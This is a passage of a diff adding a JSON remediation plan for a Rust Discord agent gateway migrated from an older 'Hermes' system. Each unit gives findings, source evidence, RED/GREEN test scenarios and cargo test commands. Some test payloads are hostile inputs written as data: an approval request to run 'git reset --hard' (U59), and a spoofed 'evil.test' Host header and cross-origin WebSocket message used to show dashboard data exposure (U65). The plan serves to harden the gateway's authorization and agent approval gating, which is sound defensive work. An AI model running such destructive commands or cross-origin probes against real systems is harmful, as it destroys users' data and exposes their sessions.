+        "CFG.C07"
+      ],
+      "files": [
+        "src/migrate/mod.rs",
+        "src/migrate/cron_cutover.rs"
+      ],
+      "tests": [
+        "tests/test_migrate.rs"
+      ],
+      "dependsOn": [
+        "U50",
+        "U51",
+        "U52"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C07 | FIX P0/P1; new cutover consistency | `mod.rs:153-180`; `cron_cutover.rs:62-75,116-121,186-192`; H:`cron/jobs.py:257-351,910-934`; H:`hermes_cli/gateway.py:4318-4345` | Verification proves ID existence only, not content/source/import receipt. Hermes can update same ID between sync and cutover's first read: updated bytes become `original`, pass later stale-byte check, and are emptied while old payload remains in SQLite. Hermes still runs until after emptying, so in-flight work can rewrite stores. Per-store mutation allows partial cutover if a later store fails; error skips gateway-down. |",
+      "scenario": "- **C07:** Quiesce verified source service before final snapshot, lock/revalidate whole import receipt and source set, compare canonical payload rather than ID; retain source on mismatch. Scope migration orchestration/cutover receipt. `cargo test --test test_migrate changed_payload_blocks_cutover`. Payload DB daily/prompt old then source same ID/prompt new before cutover read. RED emptied source with old DB; GREEN refuses without source mutation or imports new under lock. QA same real temp-store/SQLite sequence with fake OS; assert operation ordering and every store's bytes on injected second-store failure.",
+      "redCommand": "cargo test --test test_migrate changed_payload_blocks_cutover"
+    },
+    {
+      "id": "U54",
+      "title": "Dry-run shares full import validation",
+      "findings": [
+        "CFG.C08"
+      ],
+      "files": [
+        "src/migrate/mod.rs",
+        "src/cron/store.rs"
+      ],
+      "tests": [
+        "tests/test_migrate.rs"
+      ],
+      "dependsOn": [
+        "U52",
+        "U53"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C08 | FIX P1; new dry-run/apply disagreement | `mod.rs:89,194-214,265-325`; `store.rs:348-389,402-414`; H:`cron/jobs.py:512-609` | Dry-run parses IDs only and sets `would_empty=true` regardless of valid schedule/lifecycle guard or `OMON_HERMES_PROFILES`. Real import honors profile restriction and skips lifecycle jobs. A missing schedule / forbidden restart job previews as importable, then apply fails or refuses cutover after writing config/DB. |",
+      "scenario": "- **C08:** Share store selection and pure full-job validation between projection/apply; include rejected jobs/reasons. Scope mod projection + validation seam in store. `cargo test --test test_migrate dry_run_reports_nonimportable_jobs`. Payload id bad with missing schedule; selected profiles work while default has job; forbidden restart prompt. RED would_empty true/importable; GREEN explicit rejected/nonselected with would_empty false. QA fixture CLI `migrate --dry-run` matches import-only validation, zero writes.",
+      "redCommand": "cargo test --test test_migrate dry_run_reports_nonimportable_jobs"
+    },
+    {
+      "id": "U55",
+      "title": "Dotenv value fidelity",
+      "findings": [
+        "CFG.C04"
+      ],
+      "files": [
+        "src/migrate/config_import.rs"
+      ],
+      "tests": [
+        "src/migrate/config_import.rs"
+      ],
+      "dependsOn": [
+        "U50"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C04 | FIX P1; new dotenv fidelity | `config_import.rs:211-252,378-420`; `src/entry.rs:63`; H:`hermes_cli/env_loader.py:162-166,288-335` | Custom parser is not dotenv: `export DISCORD_BOT_TOKEN=x` becomes wrong key; quoted value followed by inline comment is retained with quote/comment; interpolation/escapes differ. Writer strips protective quotes and emits raw `$`/`#`/space characters; next dotenvy load may change secrets/model values. E.g. YAML api_key `a # b` writes unquoted `OPENAI_API_KEY=a # b` and reload truncates. |",
+      "scenario": "- **C04:** Replace value parsing with dotenv-compatible parsing and safe escaping; keep raw unrelated lines. Scope importer env document/renderer only. `cargo test --lib migrate::config_import::tests::dotenv_round_trip_special_values`. Payload `export DISCORD_BOT_TOKEN='x' # comment`, YAML key `a # b`, literal dollar. RED missing/corrupt values; GREEN real dotenvy reload equality. QA synthetic `--no-cutover`, parse output without exporting global environment.",
+      "redCommand": "cargo test --lib migrate::config_import::tests::dotenv_round_trip_special_values"
+    },
+    {
+      "id": "U56",
+      "title": "Effective config import and policy reporting",
+      "findings": [
+        "CFG.C02"
+      ],
+      "files": [
+        "src/migrate/config_import.rs",
+        "src/main.rs"
+      ],
+      "tests": [
+        "src/migrate/config_import.rs"
+      ],
+      "dependsOn": [
+        "U48",
+        "U55"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C02 | FIX P0/P1; P1 channel allow/ignore, role/pairing, approval config; P2 mention/bot/topic/backfill knobs (import fidelity) | `config_import.rs:7-50,257-345`; `main.rs:105-125,176-250,1357-1373`; H:`gateway/config.py:1187-1216,1373-1558,1698-1720`; H:`plugins/platforms/discord/adapter.py:9294-9408` | Import schema admits only model/approval-mode/two Discord token fields; output admits four scalar env keys. Drops allowed/ignored channels, roles, YAML `allow_from`, approval deny globs, reaction/mention/backfill/bot settings and channel overrides. Importing allowed user 42 plus ignored channel 99 drops exclusion so authorized user 42 can now invoke bot in 99. YAML-only token under `platforms.discord.token` is lost, as is root `discord.token`; `enabled:false` is ignored and token imported anyway. Existing gateway JSON-only configs fail because config.yaml is required (`:143`). Model aliases `model.name/model.model/api_base` are ignored, scalar model fails; H CLI normalizes these at `config.py:6875-6957,7413`. Unsupported applicable policies are silently discarded rather than reported. |",
+      "scenario": "- **C02:** Read effective supported YAML/legacy/env forms; emit supported controls and report/refuse unresolved security/credential settings before writes. Scope importer schema/map/preflight + importer tests. `cargo test --lib migrate::config_import::tests::imports_effective_discord_policy`. Payload token x, allow user42, ignored channel99, YAML `enabled:false`, aliases `model.name:gpt-x` in separate cases. RED lost keys or disabled bot activated; GREEN preserved mapped policy, disabled token not started, unsupported cases typed refusal with zero writes. QA run `migrate --dry-run` in synthetic HOME then `--no-cutover`; parse generated config with real runtime parser and replay authorized user42/channel99 through filter (denied).",
+      "redCommand": "cargo test --lib migrate::config_import::tests::imports_effective_discord_policy"
+    },
+    {
+      "id": "U57",
+      "title": "Per-bot named profile policy",
+      "findings": [
+        "CFG.C03"
+      ],
+      "files": [
+        "src/migrate/config_import.rs",
+        "src/multiplexer/profile_routing.rs",
+        "src/discord/adapter.rs",
+        "src/main.rs"
+      ],
+      "tests": [
+        "tests/test_profile_routing.rs"
+      ],
+      "dependsOn": [
+        "U21",
+        "U44",
+        "U56"
+      ],
+      "category": "deep",
+      "reason": "Cross-cutting state/protocol contract must remain coherent; split unrelated findings into other units.  Source evidence: | C03 | FIX P0/P1; P1 profile routing, session-context isolation | `config_import.rs:308-338`; `src/multiplexer/profile_routing.rs:52-81`; `main.rs:1251,1357-1373`; H:`gateway/profile_routing.py:51-64`; H:`gateway/run.py:18860-18928`; H:`hermes_cli/profiles.py:949-987` | All profile tokens share one global ACL and first-profile scalar fallback. Work profile user 2 is denied if root allows only user 1; root user 1 gets work-bot access despite profile restriction. Profile name/config/prompt/model/workspace/memory associations are not emitted. Hermes route `profile: work` is not represented by Rust inline routes (unknown field ignored). Numeric hierarchy exists, actual Hermes profile selection does not. |",
+      "scenario": "- **C03:** Persist bot-token-to-profile association and per-bot policy/persona/agent mapping; translate named Hermes routes or refuse conflicting profiles until supported. Scope profile manifest/import section, router configuration and bot adapter policy selection, tests. `cargo test --test test_profile_routing imported_profiles_preserve_bot_policy`. Payload root token A/users1, work token B/users2 with route chat20/profile work. RED B accepts root policy; GREEN user1 denied B, user2 accepted, selected agent/profile work. QA fixture import plus two bot-identity inbound events and recorded daemon workspace/prompt selection.",
+      "redCommand": "cargo test --test test_profile_routing imported_profiles_preserve_bot_policy"
+    },
+    {
+      "id": "U58",
+      "title": "Real per-agent policy and provider bridge",
+      "findings": [
+        "CFG.C11",
+        "CR.C13",
+        "S.F11"
+      ],
+      "files": [
+        "src/main.rs",
+        "src/agent/omo_backend.rs",
+        "src/agent/omo_protocol.rs",
+        "src/agent/agent_workspace.rs",
+        "src/dashboard_runtime.rs"
+      ],
+      "tests": [
+        "tests/test_profile_routing.rs",
+        "tests/test_migrate.rs",
+        "tests/test_cron_executor_parity.rs",
+        "tests/test_omo_backend.rs"
+      ],
+      "dependsOn": [
+        "U21",
+        "U26",
+        "U36",
+        "U37",
+        "U40",
+        "U48",
+        "U54",
+        "U57"
+      ],
+      "category": "deep",
+      "reason": "Cross-cutting state/protocol contract must remain coherent; split unrelated findings into other units.  Source evidence: | C11 | FIX P1; P1 profile toolsets; P2 per-job provider/base_url | `main.rs:580-604,974-996,1237-1250`; `omo_protocol.rs:23-80`; `omo_backend.rs:284-289`; H:`gateway/run.py:14803-14844`; H:`cron/jobs.py:1017-1070` | Model and initial system prompt reach daemon; enabled_toolsets, per-job provider/base_url do not. `build_cron_llm_config` is a legacy helper with no active executor call. Route toolsets are stored on session but never serialized to thread/start or turn/start; advertised restricted toolset cannot restrict daemon tools. Importing custom provider merely guesses Anthropic from model prefix; no provider-qualified mapping/provisioning exists in active request protocol. This is configuration wiring, not a request to reimplement agent intelligence. | | C13 | P2 provider/base_url; workdir/toolset execution | FIX | `src/main.rs:511-529,580-603,945-995`; `src/agent/omo_backend.rs:227-244`; `src/agent/omo_protocol.rs:23-45,62-80` | `cron/scheduler.py:3343-3365` | build_cron_llm_config/build_cron_tools are not called in live executor. Only Hermes model forwarded; provider/base_url and enabled_toolsets ignored. Requested workdir affects instruction file read/script cwd but not agent cwd, which is provisioned from default config. Native model ignored too. Gateway contract gap, not a request to port Hermes intelligence: implement supported OMO routing or reject unsupported overrides instead of accepting silently. | | F11 | P1 profile routing tool restriction | FIX P1 | Router/bot profile persists enabled_toolsets (`actor.rs:437-470`, `profile_routing.rs:155-163`), but sole OMO backend/protocol never consumes it (`omo_backend.rs:289-295,352-358`, `omo_protocol.rs:23-80`); `main.rs:424` tool_enabled has only test callers. Configured empty/restricted toolset still executes full remote tool inventory. H: `profile_routing.py:1-4,52-62`. This is configuration enforcement, not a demand to reimplement agent intelligence. |",
+      "scenario": "- **C11:** Enforce routed tool allowlist at daemon configuration boundary; map provider-qualified models/config only through supported OMO mechanisms or reject unsupported overrides rather than claim applied. Scope gateway request-building/config bridge; coordinate protected backend with lead. `cargo test --test test_profile_routing routed_tools_reach_daemon`; `cargo test --test test_migrate provider_override_is_not_silently_dropped`. Payload route tools `[web]`, cron model x/provider custom/base_url local stub. RED unrestricted daemon request/default provider; GREEN daemon tool restriction excludes terminal and override hits stub or explicit preflight rejection. QA local protocol server records actual thread/start/turn/start, not SessionState-only mock. No independent Hermes agent reimplementation.\n\n| C13 | Carry supported per-job runtime options to OMO session/protocol; explicitly reject unsupported provider/base_url/tool restrictions. `cargo test --test test_cron_executor_parity overrides_are_honored_or_rejected` | model=`special`, provider=`alternate`, base_url=`http://127.0.0.1:9999`, workdir under authorized temp root, enabled_toolsets=[]: RED ordinary turn silently ignores options -> GREEN actual parsed routing/cwd matches or clear pre-run unsupported error. Inspect WS frames, not prose. |\n\n| F11 | B: translate enabled_toolsets to supported remote capability controls; reject unsupported restricted config rather than silently ignore. `cargo test --test test_omo_backend profile_tool_restrictions_are_enforced` | Session enabled_toolsets=[]; peer exposes terminal. RED unrestricted start accepted; GREEN no terminal capability or explicit unsupported-config error before turn. QA inspect real wire capability request and peer-enforced denied tool invocation. |\n\nInstalled-peer closure constraint: thread/start ignores developerInstructions/runtimeWorkspaceRoots. Do not add invented wire fields or certify persona from captured request JSON alone. Use supported per-cwd resource/config loading and inspect an isolated real installed-daemon session for the selected agent persona, permitted tools, provider and memory root. An unsupported restriction/override must produce an explicit pre-run configuration error until a supported gateway-side bridge exists; never silently broaden it. Independent agent intelligence is not to be reimplemented.",
+      "redCommand": "cargo test --test test_profile_routing routed_tools_reach_daemon && cargo test --test test_migrate provider_override_is_not_silently_dropped && cargo test --test test_cron_executor_parity overrides_are_honored_or_rejected && cargo test --test test_omo_backend profile_tool_restrictions_are_enforced"
+    },
+    {
+      "id": "U59",
+      "title": "Live scoped daemon consent bridge",
+      "findings": [
+        "AP.AP02"
+      ],
+      "files": [
+        "src/agent/omo_backend.rs",
+        "src/agent/omo_protocol.rs",
+        "src/main.rs",
+        "src/dashboard_runtime.rs"
+      ],
+      "tests": [
+        "tests/test_omo_backend.rs"
+      ],
+      "dependsOn": [
+        "U01",
+        "U02",
+        "U03",
+        "U04",
+        "U05",
+        "U06",
+        "U07",
+        "U08",
+        "U09",
+        "U11",
+        "U12",
+        "U13",
+        "U14",
+        "U58"
+      ],
+      "category": "deep",
+      "reason": "Cross-cutting state/protocol contract must remain coherent; split unrelated findings into other units.  Source evidence: | AP02 | P0 #2-4 / P1 approval UX live wiring | FIX-L, feature parity | `src/agent/omo_backend.rs:477-501`, `src/agent/omo_protocol.rs:83-103`, main wiring above; H:`tools/approval.py:2756-2842` notifies and waits for a human. Every matching daemon request is declined automatically, even after `/yolo on`. No Discord prompt or scoped approval can affect that request. Existing `test_omo_backend_e2e_thread_lifecycle_and_streaming` explicitly asserts denial (`tests/test_omo_backend.rs:1091-1105`); denial-loop fail-fast is intentional and must remain for genuinely denied work. |",
+      "scenario": "### AP02 - bridge the live consent request\n\nMinimal: inject the existing requester/policy into OMO and map recognized daemon request/response schemas, retaining unconditional decline for unsupported schemas and noninteractive contexts. Keep hardline/deny and interactive deadline ahead of approval bypass; route by the actual SessionContext, not daemon-supplied channel/user fields. Never implement automatic approval for all `item/*/request`. Scope: `src/agent/omo_backend.rs`, `omo_protocol.rs`, main/dashboard runtime wiring; **protected user edits require lead coordination**.\n\nTest `omo_approval_roundtrip_uses_session_policy`; `cargo test --test test_omo_backend omo_approval_roundtrip_uses_session_policy`. Local WS sends `{id:999,method:\"item/commandExecution/requestApproval\",params:{command:\"git reset --hard\"}}`. RED: immediate decline/no ApprovalRequest. GREEN: one pending dispatch, no response before authenticated local resolver decision, one matching response after Once; timeout/deny declines and fifth actual policy denial still fail-fast. QA through local fake daemon + real dispatcher/HTTP resolver, not Discord.\n\n\n\nInstalled approval schema caveat (approval-ui-context.js:9-38): select emits parsed permission prompts; confirm emits generic commandExecution UI requests; turnId may be literal turn-approval. Bind consent to authenticated local session/subscription and request ID without assuming this placeholder is the real running turn. Supporting these UI requests does not prove all daemon tools cross this hook. Real-daemon QA must distinguish actual tool policy coverage from a synthetic extension confirmation; never classify an arbitrary confirm title as a faithful executable argv.",
+      "redCommand": "cargo test --test test_omo_backend omo_approval_roundtrip_uses_session_policy"
+    },
+    {
+      "id": "U60",
+      "title": "Unified effective default model",
+      "findings": [
+        "CFG.C12"
+      ],
+      "files": [
+        "src/main.rs",
+        "src/dashboard_runtime.rs"
+      ],
+      "tests": [
+        "src/main.rs"
+      ],
+      "dependsOn": [
+        "U59"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C12 | FIX P1; README defaults / model selection | `main.rs:187,1237-1240`; `dashboard_runtime.rs:115`; `omo_config.rs:183-189`; H:`hermes_cli/config.py:6875-6957,7150-7164` | README gpt-4o default is actually required DEFAULT_MODEL; OMON_DEFAULT_MODEL alone still fails gateway startup. With both variables set, gateway overwrites backend's OMON_DEFAULT_MODEL preference with DEFAULT_MODEL; dashboard does not. Same environment selects different default models depending on surface. |",
+      "scenario": "- **C12:** One shared default model precedence/default contract for gateway/dashboard; honor OMON_DEFAULT_MODEL, then DEFAULT_MODEL, then documented fallback (or explicitly document required config). Scope main/runtime default selection + tests; no backend rewrite necessary. `cargo test --bin omo-gateway default_model_precedence_matches_dashboard`. Payload OMON_DEFAULT_MODEL=A, DEFAULT_MODEL=B then both absent. RED gateway B/dashboard A or startup missing-key failure; GREEN same configured A and agreed absent behavior. QA both entrypoint config construction against same isolated environment; recorded daemon model fields.",
+      "redCommand": "cargo test --bin omo-gateway default_model_precedence_matches_dashboard"
+    },
+    {
+      "id": "U61",
+      "title": "Wire final footer and truthful config docs",
+      "findings": [
+        "CFG.C13",
+        "D.D10"
+      ],
+      "files": [
+        "src/main.rs",
+        "src/dashboard_runtime.rs",
+        "src/discord/adapter.rs",
+        "README.md"
+      ],
+      "tests": [
+        "tests/test_profile_routing.rs",
+        "tests/test_discord_adapter.rs"
+      ],
+      "dependsOn": [
+        "U35",
+        "U57",
+        "U58",
+        "U60"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | C13 | FIX P2; P2 runtime footer; README truthfulness | `main.rs:80,241-244,1350-1375`; `dashboard_runtime.rs:279,308`; `discord/adapter.rs:238-291`; `README.md:126-167,224-240`; H:`gateway/display_config.py:182-241` | Footer boolean is parsed/displayed but neither copied into PoiseData nor used by active egress; helper has only test callers. README says unrelated target keys removed, yet merge deliberately preserves them. Binary advertised as `omon-gateway` but Cargo target is `omo-gateway` (`Cargo.toml:18-19`). Dashboard reports default approval `ask` though actual parse defaults Smart. Correct docs, not tested prose. | | D10 | P2 runtime footer | FIX (exposed config toggle is ineffective) | `DISCORD_RUNTIME_FOOTER` parsed main.rs:241, but main.rs:1350-1377 never assigns PoiseData.runtime_footer, and R:283 helper has no production caller. Enabling flag changes no outbound bytes. Hermes `gateway/run.py:13184-13203` builds and appends final footer. No fabricated context percentage should be shown when daemon has not reported usage. |",
+      "scenario": "- **C13:** Connect final footer opt-in to active final-message path or remove unsupported advertised knob; correct merge/binary/default documentation and dashboard effective policy display. Scope final egress config, README, runtime view. `cargo test --test test_profile_routing runtime_footer_flag_reaches_final_egress`. Payload footer true/model x/cwd temp, one final response. RED identical output with flag on/off; GREEN metadata present only on final when enabled. QA record local dispatcher final output; dashboard JSON policy equals actual parsed enum. No prose-pinning tests for README.\n\n| D10 | main config assignment and final metadata decoration, no intermediate posts. | `cargo test --test test_discord_adapter runtime_footer_toggle_is_wired` : runtime_footer=true, model route m1/cwd temp, no token usage. RED same body as false -> final includes correct machine-derived model/path, no fabricated percent; false unchanged. |",
+      "redCommand": "cargo test --test test_profile_routing runtime_footer_flag_reaches_final_egress && cargo test --test test_discord_adapter runtime_footer_toggle_is_wired"
+    },
+    {
+      "id": "U62",
+      "title": "Bound daemon restarts and readiness",
+      "findings": [
+        "R.R06"
+      ],
+      "files": [
+        "src/agent/omo_daemon.rs"
+      ],
+      "tests": [
+        "src/agent/omo_daemon.rs"
+      ],
+      "dependsOn": [],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | R06 | Daemon lifecycle, restart storms/readiness | FIX P1 | `src/agent/omo_daemon.rs:241-304`; callers `src/main.rs:1241,1330`, dashboard runtime `:120,142` | `H:gateway/status.py:69-122`, `H:gateway/restart_loop_guard.py:134-163`: watcher has infinite restart loop, no counter/window. A live replacement never returning ready falls out of readiness wait then waits forever for process exit. A crashing replacement incurs full probe window repeatedly; no circuit terminal state reaches readiness. Existing probe test covers HTTP 200/refusal, not either lifecycle path. |",
+      "scenario": "- **R06 / C:** bounded restart window/backoff, kill/reap owned unready replacement after readiness deadline, publish circuit/unready state. `cargo test --lib daemon_restart_budget_and_unready_child -- --nocapture`. Payload: fake executable exits on every start; second variant remains alive and sends 503. RED: starts exceed configured budget or unready child remains indefinitely; GREEN: budget stops respawn, unready child reaped and reported unavailable. QA: supervisor with real local child pipes/socket and virtualized clock; external daemon ownership remains untouched. Existing `test_probe_readyz_detects_http_200_and_refusal` only covers probe parsing.",
+      "redCommand": "cargo test --lib daemon_restart_budget_and_unready_child -- --nocapture"
+    },
+    {
+      "id": "U63",
+      "title": "Cross-process drain epoch",
+      "findings": [
+        "R.R10"
+      ],
+      "files": [
+        "src/drain_control.rs"
+      ],
+      "tests": [
+        "src/drain_control.rs"
+      ],
+      "dependsOn": [],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | R10 | P2 drain epoch portability | FIX P2 | `src/drain_control.rs:51-75,82-89,128-146,168-175,202-209` | `H:gateway/drain_control.py:71-136,198-239`: macOS generates independent UUID in each writer/reader process. An external process using exported writer creates a marker the gateway rejects as stale. Current roundtrip test uses one process and misses this. Empty legacy markers work; deployment marker usability is not complete. |",
+      "scenario": "- **R10 / F:** use empty epoch fallback (Hermes) or stable OS boot identity, not per-process UUID. `cargo test --lib drain_marker_cross_process_epoch -- --nocapture`. Payload: process A writes marker, process B reads in same temp directory on macOS. RED None; GREEN active request; definite synthetic old boot rejected. QA: run writer/reader helper subprocesses through public marker functions. Existing same-process roundtrip is insufficient.",
+      "redCommand": "cargo test --lib drain_marker_cross_process_epoch -- --nocapture"
+    },
+    {
+      "id": "U64",
+      "title": "Reversible admission and bounded shutdown",
+      "findings": [
+        "R.R02"
+      ],
+      "files": [
+        "src/drain_control.rs",
+        "src/main.rs",
+        "src/multiplexer/router.rs",
+        "src/multiplexer/actor.rs",
+        "src/cron/scheduler.rs",
+        "src/dashboard_runtime.rs"
+      ],
+      "tests": [
+        "src/drain_control.rs"
+      ],
+      "dependsOn": [
+        "U26",
+        "U49",
+        "U61",
+        "U63"
+      ],
+      "category": "deep",
+      "reason": "Cross-cutting state/protocol contract must remain coherent; split unrelated findings into other units.  Source evidence: | R02 | P2 drain marker; graceful in-flight drain / watchdog | FIX P1 | `src/drain_control.rs:202-216`; `src/main.rs:1435-1449`; `src/cron/scheduler.rs:529-538`; `src/multiplexer/router.rs:294-302` | `H:gateway/run.py:4949-5024,8997-9063`; `H:gateway/shutdown_watchdog.py:162-260`; `H:gateway/restart.py:24-25,46-52`: marker sends true once then exits watcher; main shuts shards down and closes pool without joining actors. No reversible gate, accepted queue drain, or common shutdown deadline. Scheduler waits all executions without an outer shutdown limit; active actor writes can race pool closure. Marker removal cannot restore service. Not merely a missing file helper. |",
+      "scenario": "- **R02 / A (+F watcher wiring):** reversible admission gate for marker presence; remove resumes acceptance; shutdown separately closes ingress, drains accepted work, then checkpoints remaining work and joins before DB close under deadline. `cargo test --bin omo-gateway drain_is_reversible_and_preserves_accepted_work -- --nocapture`. Payload: held `m1`, queued `m2`, marker `{ \"action\":\"drain\" }`, then `m3`. RED: process exits/queue disappears; GREEN: m1/m2 finish, m3 explicitly refused, marker clear permits m4 without restart. QA: actual temp marker watcher + real mux + signalled backend; separate blocked execution confirms bounded shutdown outcome. No OS-thread forensics subsystem required just to fix this concrete path.",
+      "redCommand": "cargo test --bin omo-gateway drain_is_reversible_and_preserves_accepted_work -- --nocapture"
+    },
+    {
+      "id": "U65",
+      "title": "Dashboard Host Origin and auth boundary",
+      "findings": [
+        "R.R07"
+      ],
+      "files": [
+        "src/dashboard.rs",
+        "src/dashboard_runtime.rs"
+      ],
+      "tests": [
+        "src/dashboard.rs"
+      ],
+      "dependsOn": [
+        "U42",
+        "U64"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | R07 | Dashboard auth boundary | FIX P1 | `src/dashboard.rs:94-106,571-606,1014-1023,1054-1096,1952-1955`; `src/dashboard_runtime.rs:195` | `H:hermes_cli/web_server.py:408-515`; `H:hermes_cli/dashboard_auth/middleware.py:1-15`: bind validation is not request authentication. Router has TraceLayer only; WS upgrades check neither Host nor Origin. Malicious/rebound Host can read transcripts/config or submit turns; cross-origin WS can send `message`/`stop`. `--insecure` additionally exposes all mutation APIs publicly without auth (explicit opt-in, not an accidental bind). Minimal local-host/WS-origin protection is required even if public deployment remains unsupported. |",
+      "scenario": "- **R07 / D:** enforce accepted Host on HTTP and Host+same-origin on WS; require auth or reject public bind rather than interpreting --insecure as authentication. `cargo test --bin omo-gateway dashboard_rejects_untrusted_host_and_ws_origin -- --nocapture`. Payload GET `/api/sessions` Host `evil.test`; WS `/api/sessions/probe/ws` Origin `https://evil.test`, then `{\"type\":\"message\",\"content\":\"probe\"}`. RED: 200/101 and admitted event; GREEN: 400/403 before data or event, local same-origin case works. QA: raw loopback TCP/WS requests to real spawn_server (no DNS changes needed); verify public-bind refusal without credential configuration.",
+      "redCommand": "cargo test --bin omo-gateway dashboard_rejects_untrusted_host_and_ws_origin -- --nocapture"
+    },
+    {
+      "id": "U66",
+      "title": "One multiplexed daemon for all work",
+      "findings": [
+        "R.R14"
+      ],
+      "files": [
+        "src/agent/omo_config.rs",
+        "src/main.rs",
+        "src/dashboard_runtime.rs"
+      ],
+      "tests": [
+        "src/agent/omo_config.rs"
+      ],
+      "dependsOn": [
+        "U64",
+        "U65"
+      ],
+      "category": "deep",
+      "reason": "Cross-cutting state/protocol contract must remain coherent; split unrelated findings into other units.  Source evidence: | R14 | One daemon multiplexed invariant | FIX P1 | `src/main.rs:1323-1337`; `src/dashboard_runtime.rs:138-150`; protected `src/agent/omo_config.rs:54-55,223-243` | `H:gateway/status.py:1005-1016` supports one runtime with multiplexed profiles; exact app-server topology has no Hermes analogue. Defaults explicitly ensure a second daemon on 19743 beside interactive 19742. Comment asserts one-turn-per-thread requires process isolation, which contradicts user-required per-agent multiplexing. Existing `test_cron_from_env_uses_isolated_daemon_lane` pins the contrary behavior. Coordinate with lead/protected-edit owner; do not silently accept as intentional. |",
+      "scenario": "- **R14 / J with A/E call-site coordination:** one supervisor/backend endpoint shared by interactive/cron with distinct agent threads and per-agent workspace/memory; retain independent per-turn timeout policy. `cargo test --bin omo-gateway cron_and_interactive_share_one_daemon -- --nocapture`. Payload simultaneous held cron and interactive turns on different agents. RED two spawn endpoints or interactive blocked behind cron; GREEN one process/endpoint, both turn-start events observed before either released. QA: local fake daemon implementing concurrent distinct threads, spawn counter and real configured runtime construction. Replace contrary existing test expectation explicitly, not skip it. Protected config edits are outside this audit's write authority.",
+      "redCommand": "cargo test --bin omo-gateway cron_and_interactive_share_one_daemon -- --nocapture"
+    },
+    {
+      "id": "U67",
+      "title": "Attach dashboard to actual live runtime",
+      "findings": [
+        "R.R08"
+      ],
+      "files": [
+        "src/entry.rs",
+        "src/main.rs",
+        "src/dashboard_runtime.rs",
+        "src/dashboard.rs"
+      ],
+      "tests": [
+        "src/entry.rs"
+      ],
+      "dependsOn": [
+        "U65",
+        "U66"
+      ],
+      "category": "deep",
+      "reason": "Cross-cutting state/protocol contract must remain coherent; split unrelated findings into other units.  Source evidence: | R08 | Dashboard live runtime/API contracts | FIX P1 | `src/entry.rs:78-104`; `src/dashboard_runtime.rs:58-69,120-175`; `src/main.rs:1246-1259,1277-1290,1340-1352`; `src/dashboard.rs:374-401,960-1007,1334-1344,1863-1897` | `H:gateway/status.py:966-1020,1125-1151` reports actual gateway identity/activity. Attached dashboard is actually `run_standalone(..., false)` with separate mux, approval guard, scheduler and web-only dispatcher. CompositeDispatcher is unused. Dashboard cannot stop the active Discord actor or resolve its approval; posting to stored Discord ID bypasses that actor's serialization; dashboard manual cron trigger delivers only to its web bus. Shared SQLite is not shared runtime ownership. |",
+      "scenario": "- **R08 / E:** construct shared runtime once; pass live mux, approval guard, scheduler, composite dispatcher into attached dashboard, retaining standalone as a separate explicit mode. `cargo test --bin omo-gateway attached_dashboard_controls_live_runtime -- --nocapture`. Payload: active Discord-key held event, pending approval UUID, manual cron trigger over HTTP. RED: WS stop false/approval 404/output only on web bus; GREEN: actual turn interrupted, same approval resolved, cron reaches recording primary egress exactly once. QA: real HTTP/WS router attached to same local fake-protocol runtime; verify per-session serial execution from both ingress surfaces.",
+      "redCommand": "cargo test --bin omo-gateway attached_dashboard_controls_live_runtime -- --nocapture"
+    },
+    {
+      "id": "U68",
+      "title": "Live backend and connection readiness",
+      "findings": [
+        "R.R09"
+      ],
+      "files": [
+        "src/readiness.rs",
+        "src/dashboard.rs",
+        "src/main.rs",
+        "src/dashboard_runtime.rs"
+      ],
+      "tests": [
+        "src/readiness.rs"
+      ],
+      "dependsOn": [
+        "U62",
+        "U67"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | R09 | P2 system readiness probes / status | FIX P1 | `src/dashboard.rs:661-724`; `src/readiness.rs:127-179`; `src/main.rs:1389-1400`; `src/dashboard_runtime.rs:235-254` | `H:gateway/readiness.py:26-115`; `H:gateway/status.py:1044-1119`: HTTP ready means DB SELECT 1 + path metadata + Some(mux), even when daemon is dead. Bot connections are token count, active sessions are cached actors, not busy turns. Startup logs count unstarted clients as connected and infer daemon credential readiness from arbitrary env API-key presence (including empty keys), not backend auth. Operational callers can receive healthy while no agent work can run. |",
+      "scenario": "- **R09 / H+D:** expose bounded backend probe, actual connection/lifecycle and in-flight counts; remove provider-env guess from OMO readiness. `cargo test --bin omo-gateway readiness_degrades_when_backend_unavailable -- --nocapture`. Payload: initialized mux+healthy SQLite+existing workspace but local daemon socket refused. RED HTTP 200 ready; GREEN HTTP 503 with backend false, health still 200. QA: event-controlled local daemon transitions ready -> unavailable and live status updates; do not equate configured token count with sockets.",
+      "redCommand": "cargo test --bin omo-gateway readiness_degrades_when_backend_unavailable -- --nocapture"
+    },
+    {
+      "id": "U69",
+      "title": "Truthful bot profile CRUD",
+      "findings": [
+        "R.R13"
+      ],
+      "files": [
+        "src/dashboard.rs"
+      ],
+      "tests": [
+        "src/dashboard.rs"
+      ],
+      "dependsOn": [
+        "U68"
+      ],
+      "category": "quick",
+      "reason": "Small bounded repair at the existing boundary; no neighboring refactor.  Source evidence: | R13 | Dashboard bot CRUD truthfulness | FIX P2 | `src/dashboard.rs:1574-1628,1631-1673,1731-1747`; caller `web/src/pages/BotsPage.tsx:36-46,61-70` | `H:gateway/status.py:969-1017` represents real runtime identities; no matching Hermes bot-profile CRUD contract assumed. Rust always injects three hardcoded bot rows; delete succeeds then list recreates synthetic entry, while get unknown ID returns fabricated success. DB read failures also become a healthy synthetic list. Machine-visible contract defect, not visual redesign. |",
